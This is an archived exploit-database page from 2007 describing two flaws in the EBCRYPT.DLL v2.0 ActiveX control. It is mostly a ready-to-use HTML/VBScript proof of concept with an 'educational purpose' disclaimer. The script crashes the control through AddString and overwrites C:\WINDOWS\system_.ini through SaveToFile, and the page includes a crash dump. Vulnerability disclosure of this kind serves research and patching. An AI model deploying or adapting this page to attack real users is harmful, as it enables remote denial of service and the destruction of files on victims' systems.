<html><head><title>EB Design Pty Ltd (EBCRYPT.DLL v.2.0) Multiple Remote Vulnerabilites</title></head><pre>&lt;pre&gt;
&lt;code&gt;&lt;span style=&quot;font: 10pt Courier New;&quot;&gt;&lt;span class=&quot;general1-symbol&quot;&gt;&lt;body bgcolor=&quot;#E0E0E0&quot;&gt;-----------------------------------------------------------------------------
 &lt;b&gt;EB Design Pty Ltd (EBCRYPT.DLL v.2.0) Multiple Remote Vulnerabilites&lt;/b&gt;
 url: http://www.ebcrypt.com/

 Author: shinnai
 mail: shinnai[at]autistici[dot]org
 site: http://shinnai.altervista.org

 &lt;b&gt;&lt;font color='red'&gt;This was written for educational purpose. Use it at your own risk.
 Author will be not responsible for any damage.&lt;/font&gt;&lt;/b&gt;

 Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7

 &lt;b&gt;Marked as:
 RegKey Safe for Script: False
 RegKey Safe for Init: False
 Implements IObjectSafety: True
 IDisp Safe: Safe for untrusted: caller, data
 KillBitSet: False&lt;/b&gt;

 This control contains two vulnerabilities:
 1) It is possible to cause a DoS passing at least one character to
    &quot;AddString()&quot; method. This is a dump of exception:

    Access violation when reading [3A433B2E]
    03158CA4   FF51 10 =&gt; CALL DWORD PTR DS:[ECX+10] &lt;-- crash
    ECX 3A433B2E &lt;-- &quot;.;C:&quot; (is a part of path)

 2) It is possible to overwrite a file passed as argument to &quot;SaveToFile()&quot;
    method
-----------------------------------------------------------------------------


&lt;object classid='clsid:3C34EAC7-9904-4415-BBE4-82AA8C0C0BE8' id='test1'&gt;&lt;/object&gt;
&lt;object classid='clsid:B1E7505E-BBFD-42BF-98C9-602205A1504C' id='test2'&gt;&lt;/object&gt;

&lt;input language=VBScript onclick=tryAddString() type=button value='Click here to start AddString test    '&gt;

&lt;input language=VBScript onclick=trySaveToFile() type=button value='Click here to start SaveToFile test'&gt;

&lt;script language='vbscript'&gt;
  Sub tryAddString
   test1.AddString &quot;A&quot;
  End Sub

  Sub trySaveToFile
   test2.SaveToFile &quot;C:\WINDOWS\system_.ini&quot;
   MsgBox &quot;Exploit completed.&quot;
  End Sub
&lt;/script&gt;
&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

# milw0rm.com [2007-09-24]</pre></html>